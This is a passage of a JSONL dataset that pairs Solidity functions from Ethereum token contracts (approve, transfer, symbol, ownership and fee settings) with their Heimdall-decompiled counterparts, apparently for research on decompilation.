var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_h * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            require(!((arg1 - ((store_h * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_f > store_m) {\n            if (0 - arg1) {\n            }\n            if (0 - arg1) {\n            }\n            require(store_f > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_d) == (address(arg0))) {\n            if (address(store_d) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5Bfdf57678baFB4eBB2c09279ac382397F3006b6", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\nrequire(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\nemit OwnershipTransferred(_owner, newOwner);\r\n_owner = newOwner;\r\n}", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function manualBurnLiquidityPairTokens(uint256 percent)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            block.timestamp > lastManualLpBurnTime + manualBurnFrequency,\r\n            \"Must wait for cooldown to finish\"\r\n        );\r\n        require(percent <= 1000, \"May not nuke more than 10% of tokens in LP\");\r\n        lastManualLpBurnTime = block.timestamp;\r\n\r\n        // get balance of liquidity pair\r\n        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);\r\n\r\n        // calculate amount to burn\r\n        uint256 amountToBurn = liquidityPairBalance.mul(percent).div(10000);\r\n\r\n        // pull tokens from pancakePair liquidity and move to dead address permanently\r\n        if (amountToBurn > 0) {\r\n            super._transfer(uniswapV2Pair, address(0xdead), amountToBurn);\r\n        }\r\n\r\n        //sync price since this is not in a swap transaction!\r\n        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);\r\n        pair.sync();\r\n        emit ManualNukeLP();\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function manualBurnLiquidityPairTokens(uint256 arg0) public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(lastManualLpBurnTime > ~(manualBurnFrequency)), \"Must wait for cooldown to finish\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(block.timestamp > (lastManualLpBurnTime + manualBurnFrequency), \"Must wait for cooldown to finish\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4d757374207761697420666f7220636f6f6c646f776e20746f2066696e697368;\n        require(!(arg0 > 0x03e8), \"May not nuke more than 10% of tokens in LP\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x4d6179206e6f74206e756b65206d6f7265207468616e20313025206f6620746f;\n        var_g = 0x6b656e7320696e204c5000000000000000000000000000000000000000000000;\n        lastManualLpBurnTime = block.timestamp;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = 0xc7520dbedcd17d84b4f9c25632afdb926ac64c1f;\n        (bool success, bytes memory ret0) = address(this).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!(((var_h + ret0.length) - var_h) < 0x20), \"ERC20: transfer from the zero address\");\n        require(!(var_h.length & (arg0 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / var_h.length))), \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710, \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!((var_h.length * arg0) / 0x2710), \"ERC20: transfer from the zero address\");\n        require(0xc7520dbedcd17d84b4f9c25632afdb926ac64c1f, \"ERC20: transfer from the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_e = 0xc7520dbedcd17d84b4f9c25632afdb926ac64c1f;\n        uint256 var_k = 0;\n        require(!(storage_map_t[var_e] < ((var_h.length * arg0) / 0x2710)), \"ERC20: transfer amount exceeds balance\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_j = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_e = 0xc7520dbedcd17d84b4f9c25632afdb926ac64c1f;\n        var_k = 0;\n        storage_map_t[var_e] = storage_map_t[var_e] - ((var_h.length * arg0) / 0x2710);\n        var_e = 0xdead;\n        require(!storage_map_t[var_e] > (~((var_h.length * arg0) / 0x2710)));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        storage_map_t[var_e] = storage_map_t[var_e] + ((var_h.length * arg0) / 0x2710);\n        uint256 var_i = (var_h.length * arg0) / 0x2710;\n        emit Transfer(0xc7520dbedcd17d84b4f9c25632afdb926ac64c1f, 0xdead, (var_h.length * arg0) / 0x2710);\n        var_i = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0xc7520dbedcd17d84b4f9c25632afdb926ac64c1f).code.length);\n        (bool success, bytes memory ret0) = address(0xc7520dbedcd17d84b4f9c25632afdb926ac64c1f).{ value: var_k ether }sync(var_c); // call\n        emit ManualNukeLP();\n        var_i = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function setTrading() external onlyOwner {\r\n        sellpercent = 650;\r\n        buypercent = 1000;\r\n        transferpercent = 100; \r\n         \r\n    }", "heimdall_decompiled_code": "function setTrading() public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_f = 0x028a;\n        store_g = 0x03e8;\n        store_h = 0x64;\n    }"}
{"contract_address": "0x7839BbAaFe6B84F088e494818C79D84478411D9e", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].sub(\r\n                subtractedValue,\r\n                \"ERC20: decreased allowance below zero\"\r\n            )\r\n        );\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[2639:2676];\n        address var_d = msg.sender;\n        var_e = 0x02;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_c[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_a.length;\n        require(!(0 > var_a.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = 0;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x02;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_c[var_d] = storage_map_c[var_d] - arg1;\n        address var_f = storage_map_c[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_c[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x22;\n        var_j = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_k = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x24;\n        var_j = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_k = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x55B63E91a5A7769095662Ea0990Bb736058437c7", "original_solidity_code": "function symbol() public view  returns (string memory) {\r\n        return _tokenSSSsymbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_i) {\n            if (store_i - ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (store_i - ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x03;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_l[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function name() external pure returns (string memory);\\r\\n    function symbol() external pure returns (string memory);\\r\\n    function decimals() external pure returns (uint8);\\r\\n    function totalSupply() external view returns (uint256);\\r\\n    function balanceOf(address owner) external view returns (uint256);\\r\\n    function allowance(address owner, address spender)\\r\\n        external\\r\\n        view\\r\\n        returns (uint256);\\r\\n    function approve(address spender, uint256 value) external returns (bool);\\r\\n    function transfer(address to, uint256 value) external returns (bool);\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 value\\r\\n    ) external returns (bool);\\r\\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\\r\\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\\r\\n    function nonces(address owner) external view returns (uint256);\\r\\n    function permit(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 value,\\r\\n        uint256 deadline,\\r\\n        uint8 v,\\r\\n        bytes32 r,\\r\\n        bytes32 s\\r\\n    ) external;\\r\\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\\r\\n    event Burn(\\r\\n        address indexed sender,\\r\\n        uint256 amount0,\\r\\n        uint256 amount1,\\r\\n        address indexed to\\r\\n    );\\r\\n    event Swap(\\r\\n        address indexed sender,\\r\\n        uint256 amount0In,\\r\\n        uint256 amount1In,\\r\\n        uint256 amount0Out,\\r\\n        uint256 amount1Out,\\r\\n        address indexed to\\r\\n    );\\r\\n    event Sync(uint112 reserve0, uint112 reserve1);\\r\\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\\r\\n    function factory() external view returns (address);\\r\\n    function token0() external view returns (address);\\r\\n    function token1() external view returns (address);\\r\\n    function getReserves()\\r\\n        external\\r\\n        view\\r\\n        returns (\\r\\n            uint112 reserve0,\\r\\n            uint112 reserve1,\\r\\n            uint32 blockTimestampLast\\r\\n        );\\r\\n    function price0CumulativeLast() external view returns (uint256);\\r\\n    function price1CumulativeLast() external view returns (uint256);\\r\\n    function kLast() external view returns (uint256);\\r\\n    function mint(address to) external returns (uint256 liquidity);\\r\\n    function burn(address to)\\r\\n        external\\r\\n        returns (uint256 amount0, uint256 amount1);\\r\\n    function swap(\\r\\n        uint256 amount0Out,\\r\\n        uint256 amount1Out,\\r\\n        address to,\\r\\n        bytes calldata data\\r\\n    ) external;\\r\\n    function skim(address to) external;\\r\\n    function sync() external;\\r\\n    function initialize(address, address) external;\\r\\n}\\r\\ninterface IUniswapV2Factory {\\r\\n    event PairCreated(\\r\\n        address indexed token0,\\r\\n        address indexed token1,\\r\\n        address pair,\\r\\n        uint256\\r\\n    );\\r\\n    function feeTo() external view returns (address);\\r\\n    function feeToSetter() external view returns (address);\\r\\n    function getPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        view\\r\\n        returns (address pair);\\r\\n    function allPairs(uint256) external view returns (address pair);\\r\\n    function allPairsLength() external view returns (uint256);\\r\\n    function createPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        returns (address pair);\\r\\n    function setFeeTo(address) external;\\r\\n    function setFeeToSetter(address) external;\\r\\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xE717AFf2e3d325cb5E2c7bdB9CB916ff6AF64ec7", "original_solidity_code": "function approve(address spender, uint256 value) public returns (bool) {\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - (address(msg.sender)));\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_a = address(arg0);\n        var_b = 0x01;\n        var_a = address(msg.sender);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        var_c = arg1;\n        emit Approval(address(arg0), address(msg.sender), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_r) {\n            if (store_r - ((store_r / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_r / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_r / 0x02;\n                if (store_r) {\n                    if (store_r - ((store_r / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_r / 0x02) {\n                            if (0x1f < (store_r / 0x02)) {\n                                var_a = 0x09;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_r / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x014dC23230Ac33983E2163FAd9bEA81635b3Dd34", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(arg0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x26;\n        var_c = this.code[3289:3327];\n        address var_d = address(msg.sender);\n        var_e = 0x01;\n        require(!(arg1 > storage_map_c[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_a.length;\n        require(!(0 > var_a.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = 0;\n        var_d = address(msg.sender);\n        var_e = 0x01;\n        storage_map_c[var_d] = storage_map_c[var_d] - arg1;\n        require(!(_txFee > ~(_burnFee)), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(!((_txFee + _burnFee) > 0), \"ERC20: transfer to the zero address\");\n        require(!(!(address(_FeeAddress)) == (address(msg.sender))), \"ERC20: transfer to the zero address\");\n        require(!(_txFee > ~(_burnFee)), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(!(arg1 & ((_txFee + _burnFee) > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(0x64, \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x12;\n        require(!(arg1 & (_txFee > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(0x64, \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x12;\n        var_d = address(_FeeAddress);\n        var_e = 0x01;\n        require(!(storage_map_c[var_d] > (~((arg1 * _txFee) / 0x64))), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        var_d = address(_FeeAddress);\n        var_e = 0x01;\n        storage_map_c[var_d] = storage_map_c[var_d] + ((arg1 * _txFee) / 0x64);\n        require(!(arg1 & (_txFee > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(0x64, \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x12;\n        uint256 var_f = (arg1 * _txFee) / 0x64;\n        emit Transfer(address(msg.sender), address(_FeeAddress), (arg1 * _txFee) / 0x64);\n        require(!_burnFee, \"ERC20: transfer to the zero address\");\n        require(!(arg1 < ((arg1 * (_txFee + _burnFee)) / 0x64)), \"ERC20: transfer to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x20;\n        var_l = 0x23;\n        var_m = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x20;\n        var_l = 0x25;\n        var_m = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \\\"ERC20: decreased allowance below zero\\\"));\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[13637:13674];\n        address var_d = msg.sender;\n        var_e = 0x01;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_e[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_a.length;\n        uint256 var_i = 0;\n        require(!((storage_map_e[var_d] - arg1) > storage_map_e[var_d]), \"ERC20: approve to the zero address\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_j = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x01;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_e[var_d] = storage_map_e[var_d] - arg1;\n        address var_f = storage_map_e[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_e[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x22;\n        var_k = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_l = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x24;\n        var_k = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_l = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function changeW3(address BaW) external onlyOwner {\r\n        require(BaW != address(0),\"BigBoss: Address Zero\");\r\n        BAddress = payable(BaW);\r\n        emit _changeW3(BaW);\r\n    }", "heimdall_decompiled_code": "function changeW3(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"BigBoss: Address Zero\");\n        store_k = (address(arg0)) | (uint96(store_k));\n        address var_a = address(arg0);\n        emit _changeW3(address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x15;\n        var_d = 0x426967426f73733a2041646472657373205a65726f0000000000000000000000;\n    }"}
